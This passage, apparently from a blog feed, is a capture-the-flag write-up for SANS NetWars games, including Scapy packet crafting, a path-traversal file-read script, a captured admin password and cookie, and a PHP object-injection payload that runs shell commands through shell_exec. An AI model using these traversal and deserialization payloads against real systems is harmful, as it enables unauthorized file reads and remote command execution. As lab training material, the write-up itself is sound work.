-          document.getElementById(&quot;0,&quot; + x + &quot;,&quot; + y).classList.add(&quot;fort&quot;);
-        }
-      }
-    }
-  }
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Click the forts and you end up with a message:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You win!
-You won on impossible! NetWars{YouMustBePeeking
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;defeat-the-enemy-with-one-shot-and-submit-the-flag&quot;&gt;Defeat the Enemy with one shot and submit the flag.&lt;/h2&gt;
-
-&lt;p&gt;Enemy is very literal here and refers to the actual text on the board which is right above 0,0. So lets entire 0, -1 in and we get the following message&lt;br /&gt;
-in the console:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NetWars{ThatsOneWayToWin}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;play-pawng&quot;&gt;Play pawng&lt;/h1&gt;
-
-&lt;h2 id=&quot;complete-the-pawng-scapy-trainer-whats-your-certificate-id-number&quot;&gt;Complete the Pawng Scapy Trainer. What’s your certificate ID number?&lt;/h2&gt;
-
-&lt;p&gt;47150284637509565 – Just go through the training to get it. Look at the scapy docs.&lt;/p&gt;
-
-&lt;h2 id=&quot;find-the-get-help-instruction-id-from-sending-a-scapy-packet&quot;&gt;Find the (Get Help) Instruction ID from sending a Scapy packet&lt;/h2&gt;
-
-&lt;p&gt;The packet is described in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_controller.py&lt;/code&gt;, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tail -F /var/log/pawng.log&lt;/code&gt;, and use the python to send the packet&lt;/p&gt;
-
-&lt;p&gt;2196517487091929&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elfadmin@7fbaa7f9eae5:~$ python3
-Python 3.6.9 (default, Apr 18 2020, 01:56:04)
-[GCC 8.4.0] on linux
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-&amp;gt;&amp;gt;&amp;gt; from scapy.all import *
-&amp;gt;&amp;gt;&amp;gt; sr1(IP(dst=&quot;127.0.0.1&quot;)/UDP(dport=20,sport=5000))
-Begin emission:
-Finished sending 1 packets.
-.*
-Received 2 packets, got 1 answers, remaining 0 packets
-&amp;lt;IP  version=4 ihl=5 tos=0x0 len=1536 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x76ea src=127.0.0.1 dst=127.0.0.1 |&amp;lt;UDP  sport=20 dport=5000 len=1516 chksum=0x5581 |&amp;lt;Raw  load=&apos;\xe2\x94\x8d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
-80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9
-4\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
-\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x91\
-n\xe2\x94\x82 ARCADE PAWNG HELP:                                           \xe2\x94\x82\n\xe2\x94\x95\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
-\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\
-xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
-80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x99\n1. Get This Help Menu:\n    Send a UDP packet to any 127.0.0.1 w/ a dst UDP port of 20\n
-   and src UDP port of 5000.\n2. Move Paddle Up:\n    Send a TCP packet w/ IP dst=&quot;127.0.20.180&quot;, TCP dport=20, \n    TCP flags=&quot;PA&quot;, and a TCP raw paylod of load=&quot;up&quot;.\n3. Move Paddle Down:\n    Send an ICMP echo reply w/ IP dst=&quot;127.80
-.1.46&quot;, and a \n    ICMP raw paylod of load=&quot;down&quot;.\n4. Change Computer Opponent\&apos;s Difficulty:\n    Send a DNS query response to UDP port 53 with a source \n    port of 6000 to any 127.0.0.1 with a DNS qr=1, DNSQR \n    qname=&quot;difficult
-y.local&quot;, and the DNSRR \n    rrname=&quot;difficulty.local&quot; and the DNSRR rdata=&quot;100&quot;.\nNote: The 100 in rdata=&quot;100&quot;, specifies difficulty from 0-100.\nNote: Packet protocol details NOT specified above dont matter.\nNote: Results of actions
-1-4 are logged to /var/log/pawng.log.\nNote: The first to score 10 points wins. \n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x8
-0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94
-\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\
-x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n&apos; |&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt;
-KeyboardInterrupt
-&amp;gt;&amp;gt;&amp;gt;
-KeyboardInterrupt
-&amp;gt;&amp;gt;&amp;gt;
-elfadmin@7fbaa7f9eae5:~$ cat /var/log/pawng.log
-(Get Help) Instruction ID 2196517487091929 Executed
-(Get Help) Instruction ID 2196517487091929 Executed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Get This Help Menu:
-    Send a UDP packet to any 127.0.0.1 w/ a dst UDP port of 20
-   and src UDP port of 5000.
-2. Move Paddle Up:
-    Send a TCP packet w/ IP dst=&quot;127.0.20.180&quot;, TCP dport=20,
-    TCP flags=&quot;PA&quot;, and a TCP raw paylod of load=&quot;up&quot;.
-3. Move Paddle Down:
-    Send an ICMP echo reply w/ IP dst=&quot;127.80.1.46&quot;, and a
-    ICMP raw paylod of load=&quot;down&quot;.
-4. Change Computer Opponent\&apos;s Difficulty:
-    Send a DNS query response to UDP port 53 with a source
-    port of 6000 to any 127.0.0.1 with a DNS qr=1, DNSQR
-    qname=&quot;difficulty.local&quot;, and the DNSRR
-    rrname=&quot;difficulty.local&quot; and the DNSRR rdata=&quot;100&quot;.
-Note: The 100 in rdata=&quot;100&quot;, specifies difficulty from 0-100.
-Note: Packet protocol details NOT specified above dont matter.
-Note: Results of actions 1-4 are logged to /var/log/pawng.log.
-Note: The first to score 10 points wins.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;find-the-move-up-paddle-instruction-id&quot;&gt;Find the (Move Up) Paddle Instruction ID&lt;/h2&gt;
-
-&lt;p&gt;9802227387255195&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lfadmin@7fbaa7f9eae5:~\$ python3
-Python 3.6.9 (default, Apr 18 2020, 01:56:04)
-[GCC 8.4.0] on linux
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-
-&amp;gt; &amp;gt; &amp;gt; from scapy.all import\*
-&amp;gt; &amp;gt; &amp;gt; sr1(IP(dst=&quot;127.0.20.180&quot;)/TCP(dport=20,flags=&quot;PA&quot;)/Raw(load=&quot;up&quot;))
-&amp;gt; &amp;gt; &amp;gt; Begin emission:
-&amp;gt; &amp;gt; &amp;gt; Finished sending 1 packets.
-&amp;gt; &amp;gt; &amp;gt; .^C
-&amp;gt; &amp;gt; &amp;gt; Received 1 packets, got 0 answers, remaining 1 packets
-&amp;gt; &amp;gt; &amp;gt;
-&amp;gt; &amp;gt; &amp;gt; elfadmin@7fbaa7f9eae5:~\$ cat /var/log/pawng.log
-&amp;gt; &amp;gt; &amp;gt; (Get Help) Instruction ID 2196517487091929 Executed
-&amp;gt; &amp;gt; &amp;gt; (Get Help) Instruction ID 2196517487091929 Executed
-&amp;gt; &amp;gt; &amp;gt; (Move Up) Paddle Instruction ID 9802227387255195 Executed
-&amp;gt; &amp;gt; &amp;gt; (Move Up) Paddle Instruction ID 9802227387255195 Executed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;find-the-move-down-instruction&quot;&gt;Find the Move Down Instruction&lt;/h2&gt;
-
-&lt;p&gt;2116779544198846&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elfadmin@7fbaa7f9eae5:~$ tail -F /var/log/pawng.log &amp;amp;
-[1] 206
-elfadmin@7fbaa7f9eae5:~$ (Get Help) Instruction ID 2196517487091929 Executed
-(Get Help) Instruction ID 2196517487091929 Executed
-(Move Up) Paddle Instruction ID 9802227387255195 Executed
-(Move Up) Paddle Instruction ID 9802227387255195 Executed
-elfadmin@7fbaa7f9eae5:~\$ python3
-Python 3.6.9 (default, Apr 18 2020, 01:56:04)
-[GCC 8.4.0] on linux
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-
-&amp;gt; &amp;gt; &amp;gt; from scapy.all import \*
-&amp;gt; &amp;gt; &amp;gt; send(IP(dst=&quot;127.80.1.46&quot;)/ICMP(type=&quot;echo-reply&quot;)/Raw(load=&quot;down&quot;))
-&amp;gt; &amp;gt; &amp;gt; .
-&amp;gt; &amp;gt; &amp;gt; Sent 1 packets.
-&amp;gt; &amp;gt; &amp;gt; (Move Down) Paddle Instruction ID 2116779544198846 Executed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;find-the-change-difficult-instruction-id&quot;&gt;Find the CHange Difficult Instruction ID&lt;/h2&gt;
-
-&lt;p&gt;8892931792975189&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elfadmin@7fbaa7f9eae5:~\$ ./scapy
-&amp;gt; &amp;gt; &amp;gt; sr1(IP(dst=&quot;127.0.0.1&quot;)/UDP(sport=6000, dport=53)/DNS(qr=1,qd=DNSQR(qname=&quot;difficulty.local&quot;), an=DNSRR(rrname=&quot;difficulty.local&quot;, rdata=&quot;0&quot;)))
-&amp;gt; &amp;gt; &amp;gt; Begin emission:
-&amp;gt; &amp;gt; &amp;gt; Finished sending 1 packets.
-&amp;gt; &amp;gt; &amp;gt; .(Change Difficulty) Instruction ID 8892931792975189 Executed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;win-pawng&quot;&gt;Win Pawng!&lt;/h2&gt;
-
-&lt;p&gt;Use the packets above in the source code after copying it into a new file. If you set the difficulty to 0 you’ll just win really quick. The win screen says&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Prolific Ping Pawng Pwner&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def set_difficulty(GAME_DIFFICULTY=&quot;100&quot;):
-    send(IP(dst=&quot;127.0.0.1&quot;)/UDP(sport=6000, dport=53)/DNS(qr=1,qd=DNSQR(qname=&quot;difficulty.local&quot;), an=DNSRR(rrname=&quot;difficulty.local&quot;, rdata=&quot;0&quot;)), iface=&quot;lo&quot;, verbose=False)
-
-def paddle_up():
-    send(IP(dst=&quot;127.0.20.180&quot;)/TCP(dport=20,flags=&quot;PA&quot;)/Raw(load=&quot;up&quot;), iface=&quot;lo&quot;, verbose=False)
-
-def paddle_down():
-    send(IP(dst=&quot;127.80.1.46&quot;)/ICMP(type=&quot;echo-reply&quot;)/Raw(load=&quot;down&quot;), iface=&quot;lo&quot;, verbose=False)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;elf-invaders&quot;&gt;Elf Invaders&lt;/h1&gt;
-
-&lt;p&gt;https://www.bram.us/2020/04/08/how-to-enable-http3-in-chrome-firefox-safari/ Enable HTTP3 in firefox&lt;/p&gt;
-
-&lt;h2 id=&quot;find-the-version-number-of-the-cabinet-once-you-see-the-game-eg-8675309&quot;&gt;Find the version number of the Cabinet once you see the game. (e.g. 8.675309)&lt;/h2&gt;
-
-&lt;p&gt;In the source of the main HTML file is&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;meta name=&quot;description&quot; content=&quot;Elf Invaders Version 1.61434327095534551&quot; /&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;what-is-the-message-when-you-score-over-9500-eg-thats-over-9500&quot;&gt;What is the message when you score over 9500? (e.g. That’s over 9500!)&lt;/h2&gt;
-
-&lt;p&gt;In the hitbox detection function, set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;player.score = 10000&lt;/code&gt; and then let it resume execution. You eventually make a request to the API that results in a response&lt;br /&gt;
-with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Score Level Over 9000!&lt;/code&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;Disclosure&lt;/strong&gt;: I did not complete the challenges below. The following notes are from another player that shared the notes with me.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;whats-the-date-in-apiphp&quot;&gt;What’s the date in api.php?&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5/1/2019&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;It looks like there’s an api request with a file. Use the curl version on the elf debug terminal since it has http3 support. Create a script, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lfi.sh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
-curl --silent --http3 &apos;https://elf-invaders.elfu.org/api.php&apos; -H &apos;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&apos; -H &apos;Accept: */*&apos; -H &apos;Accept-Language: en-US,en;q=0.5&apos; -H &apos;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&apos; -H &apos;X-Requested-With: XMLHttpRequest&apos; -H &apos;Origin: https://elf-invaders.elfu.org&apos; -H &apos;Alt-Used: elf-invaders.elfu.org&apos; -H &apos;Connection: keep-alive&apos; -H &apos;Referer: https://elf-invaders.elfu.org/leaderboard.php&apos; -H &apos;Sec-Fetch-Dest: empty&apos; -H &apos;Sec-Fetch-Mode: cors&apos; -H &apos;Sec-Fetch-Site: same-origin&apos; -H &apos;TE: Trailers&apos; --data-raw &quot;conf=${1}&quot; | sed -n &apos;s/.*&quot;data&quot;:&quot;//p&apos; | sed -n &apos;s/&quot;}//p&apos;
-echo &apos;&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can then use the script to grab stuff&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../config/config.json returns a file
-../../www/config/config.json
-./lfi.sh &quot;../../../var/www/config/config.json&quot; works but /var/www/config/config.json doesn&apos;t work
-../lfi.sh ../html/api.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;in api.php&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-  // Made By Alabaster Snowball on 5/1/2019
-  function get_db() {
-    $dbname = &apos;/var/www/db/elfinvaders.sqlite&apos;;
-    if (file_exists($dbname) &amp;amp;&amp;amp; filesize($dbname) &amp;gt; 500000) {
-      unlink($dbname);
-    }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;find-the-name-of-the-debug-pcap-on-the-web-server&quot;&gt;Find the name of the debug PCAP on the web server.&lt;/h2&gt;
-
-&lt;p&gt;Looking in api.php, we can do directory listings too with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list=&lt;/code&gt; as the payload. Create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir.sh&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
-curl --silent --http3 &apos;https://elf-invaders.elfu.org/api.php&apos; -H &apos;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&apos; -H &apos;Accept: */*&apos; -H &apos;Accept-Language: en-US,en;q=0.5&apos; -H &apos;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&apos; -H &apos;X-Requested-With: XMLHttpRequest&apos; -H &apos;Origin: https://elf-invaders.elfu.org&apos; -H &apos;Alt-Used: elf-invaders.elfu.org&apos; -H &apos;Connection: keep-alive&apos; -H &apos;Referer: https://elf-invaders.elfu.org/leaderboard.php&apos; -H &apos;Sec-Fetch-Dest: empty&apos; -H &apos;Sec-Fetch-Mode: cors&apos; -H &apos;Sec-Fetch-Site: same-origin&apos; -H &apos;TE: Trailers&apos; --data-raw &quot;list=${1}&quot;
-echo &apos;&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can use this to list files and find there’s a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adminlogin_debug.pcap&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;find-alabasters-password-eg-directreindeerflatterystable&quot;&gt;Find Alabaster’s password. (e.g. DirectReindeerFlatteryStable)&lt;/h2&gt;
-
-&lt;p&gt;Grabbing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adminlogin_debug.client_random&lt;/code&gt; and using it in wireshark to decrypt the QUIC in the pcap we find some payloads:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@Ç(ÍðôÒ¹~îåÚ6¡GREASE is the word,ÔQ`rRj®zÿ×P¢\.®Ã_P%¶PÃ«¸úàZþ?ÝTqÿï@Eusername=alabaster_snowball&amp;amp;password=4084072e86e12aabef9ace3e39145ba3
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4084072e86e12aabef9ace3e39145ba3&lt;/code&gt; as the flag works.&lt;/p&gt;
-
-&lt;h2 id=&quot;update-the-cabinets-firmware-and-retrieve-the-new-version-number&quot;&gt;Update the cabinet’s firmware and retrieve the new version number.&lt;/h2&gt;
-
-&lt;p&gt;People left files sitting around so I found this without doing what’s intended, just the LFI and directory listing, but I did most of the object injection anyways.&lt;/p&gt;
-
-&lt;p&gt;2.11516925085506347&lt;/p&gt;
-
-&lt;p&gt;get_auth_cookie.sh&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
-curl -v --http3 &apos;https://elf-invaders.elfu.org/admin.php&apos; -H &apos;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&apos; -H &apos;X-Requested-With: XMLHttpRequest&apos; -H &apos;Origin: https://elf-invaders.elfu.org&apos; -H &apos;Alt-Used: elf-invaders.elfu.org&apos; -H &apos;Connection: keep-alive&apos; -H &apos;Referer: https://elf-invaders.elfu.org/leaderboard.php&apos; -H &apos;Sec-Fetch-Dest: empty&apos; -H &apos;Sec-Fetch-Mode: cors&apos; -H &apos;Sec-Fetch-Site: same-origin&apos; -H &apos;TE: Trailers&apos; --data-raw &quot;username=alabaster_snowball&amp;amp;password=4084072e86e12aabef9ace3e39145ba3&quot; 2&amp;gt;&amp;amp;1 | grep &quot;set-cookie&quot; | sed -E &quot;s/.*elfinv=([a-zA-Z0-9._-]+);.*/\1/&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;php for generating the object injection&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-  class OldAdminMethod
-  {
-    // Will remove this later after testing more secure new admin class
-    public $command;
-    public $logname;
-
-    function __construct($cmd=&quot;&quot;, $log=&apos;/var/www/db/cmdhist.log&apos;)
-    {
-      $this-&amp;gt;command = $cmd;
-      $this-&amp;gt;logname = $log;
-    }
-
-    public function readlog() {
-      if (file_exists($this-&amp;gt;logname) &amp;amp;&amp;amp; is_readable($this-&amp;gt;logname)) {
-        return preg_replace( &apos;/[^[:print:]\r\n\t]/&apos;, &apos;&apos;, file_get_contents($this-&amp;gt;logname));
-      }
-    }
-
-    function __destruct()
-    {
-      $stdout = shell_exec($this-&amp;gt;command);
-      if (strlen($stdout)) {
-        if (is_writable(dirname($this-&amp;gt;logname))) {
-          file_put_contents($this-&amp;gt;logname, &quot;{$this-&amp;gt;command}\n$stdout&quot;);
-        }
-      }
-    }
-  }
-
-$file = &apos;/var/www/db/cmdhist.log&apos;;
-$oldAdminMethod = new OldAdminMethod(&apos;/usr/bin/firmwareupdate&apos;, $file);
-echo &quot;&apos;&quot; . serialize($oldAdminMethod) . &quot;&apos;&quot;;
-echo &quot;\n&quot;;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;generates&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos;O:14:&quot;OldAdminMethod&quot;:2:{s:7:&quot;command&quot;;s:2:&quot;ls&quot;;s:7:&quot;logname&quot;;s:23:&quot;/var/www/db/cmdhist.log&quot;;}&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then we can use the cookie and the above to generate a request to admin.php to do command injection via the object injection. When instantiating the class&lt;br /&gt;
-the constructor and then the destructor will be called.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -v --http3 &apos;https://elf-invaders.elfu.org/admin.php&apos; -H &quot;Cookie:
-elfinv=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxhYmFzdGVyX3Nub3diYWxsIiwiZXhwaXJlcyI6MTU4OTY3Mjc3NiwiZXhwIjozMTc5MjU5MTUyfQ.fwQJ4c-jpMHxG7_H_4uT82368Xb9DnE1LhhE0HcX03k&quot; -H &apos;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&apos; -H &apos;X-Requested-With: XMLHttpRequest&apos; -H &apos;Origin: https://elf-invaders.elfu.org&apos; -H &apos;Alt-Used: elf-invaders.elfu.org&apos; -H &apos;Connection: keep-alive&apos; -H &apos;Referer: https://elf-invaders.elfu.org/leaderboard.php&apos; -H &apos;Sec-Fetch-Dest: empty&apos; -H &apos;Sec-Fetch-Mode: cors&apos; -H &apos;Sec-Fetch-Site: same-origin&apos; -H &apos;TE: Trailers&apos; --data-raw &apos;method=read_file&amp;amp;arguments=O:14:&quot;OldAdminMethod&quot;:2:{s:7:&quot;command&quot;;s:23:&quot;/usr/bin/firmwareupdate&quot;;s:7:&quot;logname&quot;;s:23:&quot;/var/www/db/cmdhist.log&quot;;}&apos;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then we should be able to use LFI to get the log.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elfuser@bdd5e02ba86f:~\$ ./lfi.sh ../db/cmdhist.log | xxd -r -p
-/usr/bin/firmwareupdate
-Firmware Updated - Elf Invader Version 2.11516925085506347
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Ian Marrero</name></author><category term="CTF" /><category term="ctf" /><category term="cybersecurity" /><category term="netwars" /><category term="sans" /><summary type="html">I forgot to take notes and someone shared their’s with me. I stopped at “Find the name of the debug PCAP on the web server”</summary></entry><entry><title type="html">pfSense and Verizon FiOS</title><link href="https://ianmf.com/2020/02/pfsense-and-verizon-fios/" rel="alternate" type="text/html" title="pfSense and Verizon FiOS" /><published>2020-02-17T17:03:55-05:00</published><updated>2020-02-17T17:03:55-05:00</updated><id>https://ianmf.com/2020/02/pfsense-and-verizon-fios</id><content type="html" xml:base="https://ianmf.com/2020/02/pfsense-and-verizon-fios/">&lt;p&gt;I have a small homelab setup at home that I use to practice cyber ninja skills and test new technology. My homelab consist of a refurbished HP Z420 Workstation with 64 GB RAM and over 2 TB of SSD storage used as a server. The server is running VMware ESXI 6.7, which hosts several VMs. One of the VMs is pfSense and has a 2 NIC adapter assigned for LAN and WAN. I also have Verizon’s FiOS G1100 router that I use for its MoCA support (Video On Demand, DVR, Caller ID, etc). However, I do not need it any of its other functionalities.&lt;/p&gt;
-
